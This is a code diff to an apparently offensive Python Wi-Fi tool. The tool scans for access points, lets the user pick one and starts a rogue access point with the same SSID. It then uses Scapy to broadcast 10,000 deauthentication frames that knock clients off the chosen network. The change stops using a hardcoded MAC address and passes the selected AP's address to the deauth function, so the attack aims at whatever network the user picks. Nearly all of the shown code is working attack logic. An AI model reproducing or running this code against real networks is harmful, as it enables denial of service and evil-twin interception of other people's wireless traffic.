@@ -62,7 +62,7 @@ def apRescanHandler(interface):
     while attSsid == "R" or attSsid == "r":
         devices = (list(printAP(interface)))
         attSsid = input("\nChoose your attack AP or \"R\" fore rescan: ")
-    return devices[int(attSsid) - 1].ssid
+    return [devices[int(attSsid) - 1].ssid, devices[int(attSsid) - 1].address]
 
 def startAP(ssid, interface):
     # Remove and create dnsmasq.conf
@@ -89,12 +89,11 @@ def stopAttack():
     print(f.read())
 
 
-def deauth():
+def deauth(brdmac, addr):
     print("\nChoose interface for deauth attack")
     interface = chooseDevice()
     goMonitorMode(interface)
-    brdmac = "ff:ff:ff:ff:ff:ff"
-    pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = "A4:91:B1:8A:A4:46", addr3 = "A4:91:B1:8A:A4:46") / Dot11Deauth()
+    pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = addr, addr3 = addr) / Dot11Deauth()
     sendp(pkt, iface=interface, count=10000, inter=.2)
 
 class AP:
@@ -144,9 +143,13 @@ def printDevices(ssid):
 if __name__ == "__main__":
     checkFotRoot()
     apDevice = chooseDevice()
-    ssid = apRescanHandler(apDevice)
+    ap = apRescanHandler(apDevice)
+    ssid = ap[0]
+    addr = ap[1]
+    print(type(addr))
     startAP(ssid, apDevice)
-    deauth()
+    brdmac = "ff:ff:ff:ff:ff:ff"
+    deauth(brdmac, addr)
     # os.system("rm wifi_map.yaml")
     # os.system('trackerjacker -i ' + apDevice + ' --map')
     # printDevices("Casa")
